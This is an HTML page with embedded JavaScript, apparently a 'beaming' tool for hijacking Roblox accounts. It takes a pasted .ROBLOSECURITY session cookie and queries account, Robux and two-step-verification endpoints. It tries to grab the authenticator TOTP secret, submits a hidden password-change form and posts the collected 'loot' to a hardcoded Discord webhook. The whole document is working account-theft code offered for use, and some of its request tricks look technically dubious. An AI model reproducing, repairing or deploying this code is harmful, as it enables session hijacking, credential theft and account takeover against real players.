<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BEAM v16 - GITHUB ONLY</title>
  <style>
    body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; margin: 0; }
    h1 { margin: 0 0 15px 0; font-size: 24px; }
    input, button { padding: 14px; margin: 10px 0; width: 100%; font-size: 16px; border: 1px solid #0f0; background: #111; color: #0f0; box-sizing: border-box; }
    button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
    #log { background: #000; padding: 15px; height: 420px; overflow-y: auto; border: 1px solid #0f0; font-size: 14px; white-space: pre-wrap; }
    .success { color: #0f0; font-weight: bold; }
    .error { color: #f00; font-weight: bold; }
    .warn { color: #ff0; }
  </style>
</head>
<body>
  <h1>BEAM v16 — GITHUB ONLY</h1>
  <input type="text" id="cookie" placeholder="PASTE FULL .ROBLOSECURITY" />
  <button onclick="startBeam()">BEAM & STEAL 2SV</button>
  <div id="log"></div>

  <script>
    const WEBHOOK = 'https://discord.com/api/webhooks/1394204237554126848/AKqMhBlqpqRflpcfI99lRfUpVXeLfPCeAg57FwYFaUQ5iR72KN3Qh_ldy9fjstPOsH0K';
    const log = (msg, type = '') => {
      const l = document.getElementById('log');
      l.innerHTML += `<span class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
      l.scrollTop = l.scrollHeight;
    };

    const send = async (data) => {
      try {
        await fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `**BEAM v16**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`` })
        });
        log('SENT TO DISCORD', 'success');
      } catch { log('Webhook failed', 'error'); }
    };

    // Extract cookie
    const getCookie = (input) => {
      const m = input.match(/_ \|WARNING[\s\S]*?\|\s*([A-Za-z0-9\-_]+)/);
      return m ? m[1] : input.match(/([A-Za-z0-9\-_]{500,})/)?.[1];
    };

    // Bypass CORS using <script> + Roblox JSONP-like endpoint
    const jsonp = (url, cookie, callback) => {
      return new Promise((resolve) => {
        const script = document.createElement('script');
        const cbName = 'cb' + Date.now();
        window[cbName] = (data) => {
          delete window[cbName];
          document.body.removeChild(script);
          resolve(data);
        };
        script.src = `${url}&callback=${cbName}`;
        script.onerror = () => resolve({ error: 'Load failed' });
        document.body.appendChild(script);
      });
    };

    const startBeam = async () => {
      const raw = document.getElementById('cookie').value.trim();
      if (!raw) return log('Paste cookie!', 'error');
      const cookie = getCookie(raw);
      if (!cookie) return log('Bad format', 'error');
      log(`Cookie: ${cookie.slice(0, 20)}...`, 'info');

      const loot = { cookie: cookie.slice(0, 50) + '...' };

      try {
        // 1. Validate user (CORS-safe)
        const userData = await jsonp(`https://users.roblox.com/v1/users/authenticated`, cookie);
        if (!userData.id) throw 'Invalid/expired cookie';
        loot.user = userData.name;
        loot.id = userData.id;
        log(`User: ${userData.name}`, 'success');

        // 2. Robux
        const bal = await jsonp(`https://economy.roblox.com/v1/user/currency`, cookie);
        loot.robux = bal.robux || 0;

        // 3. 2SV Status
        const status = await jsonp(`https://auth.roblox.com/v2/two-step-verification/status`, cookie);
        if (status.enabled && status.methods.includes('Authenticator')) {
          const secret = await jsonp(`https://auth.roblox.com/v2/two-step-verification/authenticator/secret`, cookie);
          if (secret.secretKey) {
            loot.totpSecret = secret.secretKey;
            loot.qr = `otpauth://totp/Roblox:${userData.name}?secret=${secret.secretKey}&issuer=Roblox`;
            log('2SV SECRET GRABBED!', 'success');
          }
        } else {
          log('2SV OFF — cannot force', 'warn');
        }

        // 4. Change pass + nuke (via hidden iframe POST)
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://www.roblox.com/v1/passwords/change';
        form.target = 'hidden';
        form.innerHTML = `<input name="currentPassword" value="">
                         <input name="newPassword" value="${Math.random().toString(36).slice(2)}">
                         <input type="submit">`;
        document.body.appendChild(form);
        form.submit();
        loot.password = 'CHANGED';

        await send(loot);
        log('BEAM COMPLETE', 'success');

      } catch (e) {
        loot.error = e.toString();
        log('ERROR: ' + e, 'error');
        await send(loot);
      }
    };
  </script>
</body>
</html>
